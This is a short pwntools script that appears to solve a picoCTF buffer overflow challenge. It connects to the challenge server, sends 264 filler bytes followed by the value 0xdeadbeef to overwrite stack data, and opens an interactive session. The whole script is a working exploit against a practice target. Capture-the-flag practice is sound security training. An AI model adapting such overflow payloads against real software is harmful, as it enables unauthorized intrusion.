from pwn import *

bin='./chall'

context.binary=bin

#OFFLINE version
#p=process(bin)
#ONLINE version
p=connect('mars.picoctf.net',31890)

payload=b'A'*264+pack(0xdeadbeef)

p.recvuntil(b"What do you see?")
p.sendline(payload)

p.interactive()
